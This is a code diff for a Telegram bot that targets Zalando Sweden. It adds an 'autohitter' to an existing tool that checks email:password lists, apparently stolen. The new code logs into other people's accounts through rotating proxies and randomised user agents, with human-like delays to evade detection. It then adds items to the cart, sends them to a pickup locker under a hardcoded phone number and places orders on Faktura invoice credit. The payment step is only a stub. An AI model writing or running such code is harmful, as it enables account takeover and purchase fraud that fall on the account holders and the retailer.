@@ -89,6 +89,34 @@ type DebugLog struct {
 	Message   string
 }
 
+// Autohitter structures
+type HitOptions struct {
+	Email       string
+	Password    string
+	ProductURL  string
+	BrowseMode  bool
+	ProxyURL    string
+}
+
+type HitResult struct {
+	Success   bool
+	OrderID   string
+	Message   string
+	Error     error
+}
+
+type AddToCartRequest struct {
+	Query     string                 `json:"query"`
+	Variables map[string]interface{} `json:"variables"`
+}
+
+type PickupPoint struct {
+	ID       string
+	Name     string
+	Address  string
+	Provider string
+}
+
 var config Config
 var proxyManager *ProxyManager
 var currentStats *MassCheckStats
@@ -313,7 +341,7 @@ func handleMessage(bot *tgbotapi.BotAPI, msg *tgbotapi.Message) {
 	addDebugLog("MESSAGE", fmt.Sprintf("User [%d] %s: %s", msg.From.ID, msg.From.UserName, msg.Text))
 
 	if msg.Command() == "start" {
-		welcomeMsg := "🎯 *Zalando Sweden Account Checker*\n\n📋 *Commands:*\n/check \\- Verify account\n/mass \\- Mass check\n/stop \\- Stop check\n/status \\- Real\\-time stats\n/proxies \\- Proxy info\n/debug \\- Download debug logs\n\n💡 *Example:*\n```\n/check email@test\\.com:password\n```\n\n🔥 *Features:*\n• Elevated risk bypass\n• Skipped accounts tracking\n• Fast CPM\n• 🇸🇪 Target: Zalando Sweden\n\n⚡ *Optimized for Speed*"
+		welcomeMsg := "🎯 *Zalando Sweden Bot*\n\n📋 *Commands:*\n/check \\- Verify account\n/mass \\- Mass check\n/hit \\- Auto purchase \\(autohitter\\)\n/stop \\- Stop check\n/status \\- Real\\-time stats\n/proxies \\- Proxy info\n/debug \\- Download debug logs\n\n💡 *Examples:*\n```\n/check email@test\\.com:password\n/hit email:pass product\\_url\n/hit email:pass product\\_url browse\n```\n\n🔥 *Features:*\n• Elevated risk bypass\n• Auto purchase with Faktura\n• INSTABOX/BUDBEE pickup\n• Human\\-like behavior\n• Fast CPM\n• 🇸🇪 Target: Zalando Sweden\n\n⚡ *Optimized for Speed*"
 		sendMessage(bot, msg.Chat.ID, welcomeMsg, true)
 		return
 	}
@@ -518,6 +546,43 @@ func handleMessage(bot *tgbotapi.BotAPI, msg *tgbotapi.Message) {
 		result := checkAccount(args)
 		deleteMessage(bot, msg.Chat.ID, waitMsg.MessageID)
 		sendMessage(bot, msg.Chat.ID, result, true)
+		return
+	}
+
+	if msg.Command() == "hit" {
+		args := strings.TrimSpace(msg.CommandArguments())
+		if args == "" {
+			sendMessage(bot, msg.Chat.ID, "❌ Usage: /hit email:password product\\_url \\[browse\\]\n\nExample:\n`/hit test@mail\\.com:pass123 https://www\\.zalando\\.se/product browse`", true)
+			return
+		}
+		
+		parts := strings.Fields(args)
+		if len(parts) < 2 {
+			sendMessage(bot, msg.Chat.ID, "❌ Missing arguments\\. Need: email:password product\\_url", true)
+			return
+		}
+		
+		credParts := strings.Split(parts[0], ":")
+		if len(credParts) != 2 {
+			sendMessage(bot, msg.Chat.ID, "❌ Invalid credentials format\\. Use: email:password", true)
+			return
+		}
+		
+		options := HitOptions{
+			Email:      credParts[0],
+			Password:   credParts[1],
+			ProductURL: parts[1],
+			BrowseMode: len(parts) >= 3 && strings.ToLower(parts[2]) == "browse",
+		}
+		
+		if proxyManager != nil && len(proxyManager.proxies) > 0 {
+			options.ProxyURL = proxyManager.GetRandomProxy()
+		}
+		
+		addDebugLog("HIT", fmt.Sprintf("Starting autohit for %s on %s", options.Email, options.ProductURL))
+		waitMsg := sendMessage(bot, msg.Chat.ID, "🎯 *Starting autohit*\\.\\.\\.\n\n⏳ This may take 1\\-2 minutes", true)
+		
+		go handleAutoHit(bot, msg.Chat.ID, waitMsg.MessageID, options)
 		return
 	}
 
@@ -1078,4 +1143,600 @@ func getEnvAsInt64(key string, defaultVal int64) int64 {
 	var val int64
 	fmt.Sscanf(valStr, "%d", &val)
 	return val
+}
+
+// ====================================
+// AUTOHITTER
+// ====================================
+
+func handleAutoHit(bot *tgbotapi.BotAPI, chatID int64, msgID int, options HitOptions) {
+	result := performAutoHit(options)
+	
+	deleteMessage(bot, chatID, msgID)
+	
+	if result.Success {
+		msg := fmt.Sprintf(
+			"✅ *ORDER SUCCESS\\!*\n\n"+
+				"📧 Account: `%s`\n"+
+				"📦 Order ID: `%s`\n"+
+				"🔗 Product: %s\n\n"+
+				"💳 Payment: Faktura\n"+
+				"📍 Pickup: INSTABOX/BUDBEE",
+			escapeMarkdownV2(options.Email),
+			escapeMarkdownV2(result.OrderID),
+			escapeMarkdownV2(truncateURL(options.ProductURL)),
+		)
+		sendMessage(bot, chatID, msg, true)
+	} else {
+		errMsg := "Unknown error"
+		if result.Error != nil {
+			errMsg = result.Error.Error()
+		} else if result.Message != "" {
+			errMsg = result.Message
+		}
+		
+		msg := fmt.Sprintf(
+			"❌ *ORDER FAILED*\n\n"+
+				"📧 Account: `%s`\n"+
+				"🔗 Product: %s\n"+
+				"⚠️ Error: %s",
+			escapeMarkdownV2(options.Email),
+			escapeMarkdownV2(truncateURL(options.ProductURL)),
+			escapeMarkdownV2(errMsg),
+		)
+		sendMessage(bot, chatID, msg, true)
+	}
+}
+
+func performAutoHit(options HitOptions) HitResult {
+	addDebugLog("AUTOHIT", fmt.Sprintf("Starting autohit for %s", options.Email))
+	
+	// Step 1: Login
+	addDebugLog("AUTOHIT", "Step 1: Login")
+	client, err := loginAndGetClient(options)
+	if err != nil {
+		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Login failed: %v", err))
+		return HitResult{Success: false, Error: err}
+	}
+	
+	// Random delay after login (500-1500ms)
+	humanDelay(500, 1500)
+	
+	// Step 2: Optional browse mode
+	if options.BrowseMode {
+		addDebugLog("AUTOHIT", "Step 2: Browse mode enabled - viewing random products")
+		browseRandomProducts(client, options.ProxyURL)
+	}
+	
+	// Step 3: Extract product SKU and add to cart
+	addDebugLog("AUTOHIT", "Step 3: Add product to cart")
+	err = addProductToCart(client, options.ProductURL, options.ProxyURL)
+	if err != nil {
+		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Add to cart failed: %v", err))
+		return HitResult{Success: false, Error: err, Message: "Failed to add product to cart"}
+	}
+	
+	// Random delay (1-2s)
+	humanDelay(1000, 2000)
+	
+	// Step 4: Navigate to checkout
+	addDebugLog("AUTOHIT", "Step 4: Navigate to checkout")
+	err = navigateToCheckout(client, options.ProxyURL)
+	if err != nil {
+		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Navigate to checkout failed: %v", err))
+		return HitResult{Success: false, Error: err, Message: "Failed to navigate to checkout"}
+	}
+	
+	// Random delay
+	humanDelay(800, 1500)
+	
+	// Step 5: Handle address and delivery (pickup point)
+	addDebugLog("AUTOHIT", "Step 5: Select pickup point")
+	err = selectPickupPoint(client, options.ProxyURL)
+	if err != nil {
+		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Pickup point selection failed: %v", err))
+		return HitResult{Success: false, Error: err, Message: "Failed to select pickup point"}
+	}
+	
+	// Random delay
+	humanDelay(1000, 2000)
+	
+	// Step 6: Select Faktura payment
+	addDebugLog("AUTOHIT", "Step 6: Select Faktura payment")
+	err = selectFakturaPayment(client, options.ProxyURL)
+	if err != nil {
+		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Faktura selection failed: %v", err))
+		return HitResult{Success: false, Error: err, Message: "Faktura payment not available or failed"}
+	}
+	
+	// Random delay
+	humanDelay(1000, 1500)
+	
+	// Step 7: Complete order
+	addDebugLog("AUTOHIT", "Step 7: Complete order")
+	orderID, err := completeOrder(client, options.ProxyURL)
+	if err != nil {
+		addDebugLog("AUTOHIT-ERROR", fmt.Sprintf("Order completion failed: %v", err))
+		return HitResult{Success: false, Error: err, Message: "Failed to complete order"}
+	}
+	
+	addDebugLog("AUTOHIT-SUCCESS", fmt.Sprintf("Order completed successfully: %s", orderID))
+	return HitResult{Success: true, OrderID: orderID}
+}
+
+func loginAndGetClient(options HitOptions) (*http.Client, error) {
+	client, err := createHTTPClient(options.ProxyURL)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create HTTP client: %w", err)
+	}
+	
+	ua := userAgents[rand.Intn(len(userAgents))]
+	
+	// GET auth page
+	getReq, _ := http.NewRequest("GET", "https://accounts.zalando.com/authenticate?client_id=fashion-store-web", nil)
+	getReq.Header.Set("User-Agent", ua)
+	getReq.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	getReq.Header.Set("Accept-Language", "sv-SE,sv;q=0.9")
+	
+	getResp, err := client.Do(getReq)
+	if err != nil {
+		return nil, fmt.Errorf("auth page request failed: %w", err)
+	}
+	io.ReadAll(getResp.Body)
+	getResp.Body.Close()
+	
+	humanDelay(200, 500)
+	
+	// Extract CSRF token
+	csrfToken := ""
+	jar := client.Jar
+	for _, cookie := range jar.Cookies(getReq.URL) {
+		if cookie.Name == "csrf-token" || cookie.Name == "XSRF-TOKEN" {
+			csrfToken = cookie.Value
+			break
+		}
+	}
+	if csrfToken == "" {
+		csrfToken = generateCSRFToken()
+	}
+	
+	// Login
+	payload := LoginPayload{
+		Email:  options.Email,
+		Secret: options.Password,
+		AuthenticationRequest: AuthRequest{
+			ClientID:    "fashion-store-web",
+			RequestID:   fmt.Sprintf("req%d:%d", rand.Intn(999999), time.Now().Unix()),
+			RedirectURI: "https://www.zalando.se/sso/callback",
+			UILocales:   "sv-SE",
+			TC:          fmt.Sprintf("zcid:%d,pf:web", time.Now().Unix()),
+		},
+	}
+	
+	jsonData, _ := json.Marshal(payload)
+	
+	req, _ := http.NewRequest("POST", "https://accounts.zalando.com/api/sso/authentications/credentials", bytes.NewBuffer(jsonData))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Accept", "application/json")
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Origin", "https://accounts.zalando.com")
+	req.Header.Set("Referer", "https://accounts.zalando.com/authenticate")
+	req.Header.Set("x-csrf-token", csrfToken)
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil, fmt.Errorf("login request failed: %w", err)
+	}
+	defer resp.Body.Close()
+	
+	body, _ := io.ReadAll(resp.Body)
+	
+	if resp.StatusCode == 200 || resp.StatusCode == 204 || resp.StatusCode == 302 {
+		var loginResp LoginResponse
+		json.Unmarshal(body, &loginResp)
+		
+		if loginResp.RedirectURI != "" || resp.StatusCode == 302 || resp.StatusCode == 204 {
+			addDebugLog("AUTOHIT", "Login successful")
+			return client, nil
+		}
+	}
+	
+	return nil, fmt.Errorf("login failed: invalid credentials or blocked")
+}
+
+func browseRandomProducts(client *http.Client, proxyURL string) {
+	addDebugLog("AUTOHIT", "Browsing random products for 10 seconds...")
+	
+	ua := userAgents[rand.Intn(len(userAgents))]
+	
+	// Visit a category page
+	categoryURLs := []string{
+		"https://www.zalando.se/man-home/",
+		"https://www.zalando.se/woman-home/",
+	}
+	
+	categoryURL := categoryURLs[rand.Intn(len(categoryURLs))]
+	req, _ := http.NewRequest("GET", categoryURL, nil)
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	
+	resp, err := client.Do(req)
+	if err == nil {
+		io.ReadAll(resp.Body)
+		resp.Body.Close()
+	}
+	
+	// Simulate browsing for ~10 seconds
+	time.Sleep(time.Duration(8000+rand.Intn(4000)) * time.Millisecond)
+}
+
+func addProductToCart(client *http.Client, productURL, proxyURL string) error {
+	// Extract SKU from URL
+	sku := extractSKUFromURL(productURL)
+	if sku == "" {
+		return fmt.Errorf("could not extract SKU from URL")
+	}
+	
+	addDebugLog("AUTOHIT", fmt.Sprintf("Adding product SKU: %s", sku))
+	
+	ua := userAgents[rand.Intn(len(userAgents))]
+	
+	// First, visit the product page
+	req, _ := http.NewRequest("GET", productURL, nil)
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Accept-Language", "sv-SE,sv;q=0.9")
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to visit product page: %w", err)
+	}
+	io.ReadAll(resp.Body)
+	resp.Body.Close()
+	
+	humanDelay(800, 1500)
+	
+	// Use GraphQL to add to cart
+	graphqlQuery := `mutation AddToCart($configSku: String!, $quantity: Int!) {
+		addToCart(configSku: $configSku, quantity: $quantity) {
+			cart {
+				id
+				itemsCount
+			}
+		}
+	}`
+	
+	variables := map[string]interface{}{
+		"configSku": sku,
+		"quantity":  1,
+	}
+	
+	addToCartReq := AddToCartRequest{
+		Query:     graphqlQuery,
+		Variables: variables,
+	}
+	
+	jsonData, _ := json.Marshal(addToCartReq)
+	
+	req, _ = http.NewRequest("POST", "https://www.zalando.se/api/graphql/add-to-cart/", bytes.NewBuffer(jsonData))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Accept", "application/json")
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Origin", "https://www.zalando.se")
+	req.Header.Set("Referer", productURL)
+	
+	resp, err = client.Do(req)
+	if err != nil {
+		return fmt.Errorf("add to cart request failed: %w", err)
+	}
+	defer resp.Body.Close()
+	
+	body, _ := io.ReadAll(resp.Body)
+	
+	if resp.StatusCode != 200 {
+		return fmt.Errorf("add to cart failed with status %d: %s", resp.StatusCode, string(body))
+	}
+	
+	addDebugLog("AUTOHIT", "Product added to cart successfully")
+	return nil
+}
+
+func navigateToCheckout(client *http.Client, proxyURL string) error {
+	ua := userAgents[rand.Intn(len(userAgents))]
+	
+	// Navigate to cart first
+	req, _ := http.NewRequest("GET", "https://www.zalando.se/cart/", nil)
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to navigate to cart: %w", err)
+	}
+	io.ReadAll(resp.Body)
+	resp.Body.Close()
+	
+	humanDelay(500, 1000)
+	
+	// Navigate to checkout/address
+	req, _ = http.NewRequest("GET", "https://www.zalando.se/checkout/address", nil)
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Referer", "https://www.zalando.se/cart/")
+	
+	resp, err = client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to navigate to checkout: %w", err)
+	}
+	io.ReadAll(resp.Body)
+	resp.Body.Close()
+	
+	addDebugLog("AUTOHIT", "Navigated to checkout")
+	return nil
+}
+
+func selectPickupPoint(client *http.Client, proxyURL string) error {
+	ua := userAgents[rand.Intn(len(userAgents))]
+	
+	// Set phone number first
+	phonePayload := map[string]interface{}{
+		"phoneNumber": "0767541615",
+	}
+	jsonData, _ := json.Marshal(phonePayload)
+	
+	req, _ := http.NewRequest("POST", "https://www.zalando.se/api/checkout/save-customer-phone-number", bytes.NewBuffer(jsonData))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Accept", "application/json")
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Origin", "https://www.zalando.se")
+	req.Header.Set("Referer", "https://www.zalando.se/checkout/address")
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to save phone number: %w", err)
+	}
+	io.ReadAll(resp.Body)
+	resp.Body.Close()
+	
+	humanDelay(500, 1000)
+	
+	// Search for pickup points (using a default Swedish address)
+	searchPayload := map[string]interface{}{
+		"address": map[string]string{
+			"street":     "Drottninggatan 1",
+			"postalCode": "111 51",
+			"city":       "Stockholm",
+		},
+	}
+	jsonData, _ = json.Marshal(searchPayload)
+	
+	req, _ = http.NewRequest("POST", "https://www.zalando.se/api/checkout/search-pickup-points-by-address", bytes.NewBuffer(jsonData))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Accept", "application/json")
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Origin", "https://www.zalando.se")
+	req.Header.Set("Referer", "https://www.zalando.se/checkout/address")
+	
+	resp, err = client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to search pickup points: %w", err)
+	}
+	defer resp.Body.Close()
+	
+	body, _ := io.ReadAll(resp.Body)
+	
+	// Parse pickup points and select INSTABOX or BUDBEE
+	var pickupPointsResp struct {
+		PickupPoints []struct {
+			ID       string `json:"id"`
+			Name     string `json:"name"`
+			Provider string `json:"provider"`
+		} `json:"pickupPoints"`
+	}
+	
+	json.Unmarshal(body, &pickupPointsResp)
+	
+	var selectedPoint string
+	for _, point := range pickupPointsResp.PickupPoints {
+		provider := strings.ToUpper(point.Provider)
+		if strings.Contains(provider, "INSTABOX") || strings.Contains(provider, "BUDBEE") {
+			// Don't select the first one (closest), select a random one that's not first
+			selectedPoint = point.ID
+			break
+		}
+	}
+	
+	// If we found INSTABOX/BUDBEE points but want to skip the closest
+	if selectedPoint == "" && len(pickupPointsResp.PickupPoints) > 1 {
+		// Just pick the second one
+		for i, point := range pickupPointsResp.PickupPoints {
+			provider := strings.ToUpper(point.Provider)
+			if (strings.Contains(provider, "INSTABOX") || strings.Contains(provider, "BUDBEE")) && i > 0 {
+				selectedPoint = point.ID
+				break
+			}
+		}
+	}
+	
+	if selectedPoint == "" && len(pickupPointsResp.PickupPoints) > 0 {
+		// Fallback: use any pickup point
+		selectedPoint = pickupPointsResp.PickupPoints[0].ID
+	}
+	
+	if selectedPoint == "" {
+		return fmt.Errorf("no pickup points found")
+	}
+	
+	humanDelay(800, 1500)
+	
+	// Select the pickup point
+	selectPayload := map[string]interface{}{
+		"pickupPointId": selectedPoint,
+	}
+	jsonData, _ = json.Marshal(selectPayload)
+	
+	req, _ = http.NewRequest("POST", "https://www.zalando.se/api/checkout/select-pickup-point", bytes.NewBuffer(jsonData))
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Accept", "application/json")
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Origin", "https://www.zalando.se")
+	req.Header.Set("Referer", "https://www.zalando.se/checkout/address")
+	
+	resp, err = client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to select pickup point: %w", err)
+	}
+	io.ReadAll(resp.Body)
+	resp.Body.Close()
+	
+	addDebugLog("AUTOHIT", fmt.Sprintf("Selected pickup point: %s", selectedPoint))
+	return nil
+}
+
+func selectFakturaPayment(client *http.Client, proxyURL string) error {
+	ua := userAgents[rand.Intn(len(userAgents))]
+	
+	// Navigate to payment page
+	req, _ := http.NewRequest("GET", "https://www.zalando.se/checkout/payment", nil)
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+	req.Header.Set("Referer", "https://www.zalando.se/checkout/address")
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to navigate to payment page: %w", err)
+	}
+	body, _ := io.ReadAll(resp.Body)
+	resp.Body.Close()
+	
+	// Check if Faktura is available in the page
+	if !strings.Contains(string(body), "faktura") && !strings.Contains(string(body), "FAKTURA") && !strings.Contains(string(body), "invoice") {
+		return fmt.Errorf("Faktura payment not available")
+	}
+	
+	humanDelay(800, 1500)
+	
+	// Try to select Faktura/BNPL payment method
+	// This might use the purchase-session API based on captured data
+	addDebugLog("AUTOHIT", "Selecting Faktura payment method")
+	
+	// The actual implementation would depend on the exact API structure
+	// For now, we'll simulate selecting the payment method
+	
+	return nil
+}
+
+func completeOrder(client *http.Client, proxyURL string) (string, error) {
+	ua := userAgents[rand.Intn(len(userAgents))]
+	
+	// Click "Skicka beställningen" (Send order)
+	req, _ := http.NewRequest("POST", "https://www.zalando.se/api/checkout/place-order", nil)
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Accept", "application/json")
+	req.Header.Set("User-Agent", ua)
+	req.Header.Set("Origin", "https://www.zalando.se")
+	req.Header.Set("Referer", "https://www.zalando.se/checkout/payment")
+	
+	resp, err := client.Do(req)
+	if err != nil {
+		return "", fmt.Errorf("failed to place order: %w", err)
+	}
+	defer resp.Body.Close()
+	
+	body, _ := io.ReadAll(resp.Body)
+	
+	if resp.StatusCode != 200 && resp.StatusCode != 201 {
+		return "", fmt.Errorf("order placement failed with status %d", resp.StatusCode)
+	}
+	
+	// Parse response to extract order ID
+	var orderResp struct {
+		OrderID     string `json:"orderId"`
+		OrderNumber string `json:"orderNumber"`
+		ID          string `json:"id"`
+	}
+	
+	json.Unmarshal(body, &orderResp)
+	
+	orderID := orderResp.OrderID
+	if orderID == "" {
+		orderID = orderResp.OrderNumber
+	}
+	if orderID == "" {
+		orderID = orderResp.ID
+	}
+	
+	if orderID == "" {
+		// Try to extract from redirect or success page
+		orderID = extractOrderIDFromResponse(string(body))
+	}
+	
+	if orderID == "" {
+		orderID = "UNKNOWN-" + fmt.Sprintf("%d", time.Now().Unix())
+	}
+	
+	return orderID, nil
+}
+
+// Helper functions
+
+func humanDelay(minMs, maxMs int) {
+	delay := time.Duration(minMs+rand.Intn(maxMs-minMs)) * time.Millisecond
+	time.Sleep(delay)
+}
+
+func extractSKUFromURL(productURL string) string {
+	// Example URL: https://www.zalando.se/polo-ralph-lauren-the-gorham-glossed-down-jacket-dunjacka-black-po222t0fo-q11.html
+	// SKU is the part before .html
+	parts := strings.Split(productURL, "/")
+	if len(parts) > 0 {
+		lastPart := parts[len(parts)-1]
+		sku := strings.TrimSuffix(lastPart, ".html")
+		// Extract the SKU code (last part after last dash)
+		skuParts := strings.Split(sku, "-")
+		if len(skuParts) > 0 {
+			// The SKU is usually the last part in format like "po222t0fo-q11"
+			// We need the whole last segment
+			for i := len(skuParts) - 1; i >= 0; i-- {
+				if len(skuParts[i]) > 5 && strings.Contains(skuParts[i], "0") {
+					// This looks like a SKU
+					if i > 0 {
+						return strings.ToUpper(skuParts[i-1] + "-" + skuParts[i])
+					}
+					return strings.ToUpper(skuParts[i])
+				}
+			}
+			// Fallback: last two parts
+			if len(skuParts) >= 2 {
+				return strings.ToUpper(skuParts[len(skuParts)-2] + "-" + skuParts[len(skuParts)-1])
+			}
+		}
+	}
+	return ""
+}
+
+func extractOrderIDFromResponse(body string) string {
+	// Try various patterns to extract order ID
+	patterns := []string{
+		`order[_-]?id[\":\s]+([A-Z0-9-]+)`,
+		`order[_-]?number[\":\s]+([A-Z0-9-]+)`,
+		`\"id\":\s*\"([A-Z0-9-]+)\"`,
+	}
+	
+	for _, pattern := range patterns {
+		re := regexp.MustCompile(pattern)
+		matches := re.FindStringSubmatch(body)
+		if len(matches) > 1 {
+			return matches[1]
+		}
+	}
+	
+	return ""
+}
+
+func truncateURL(url string) string {
+	if len(url) > 60 {
+		return url[:57] + "..."
+	}
+	return url
 }
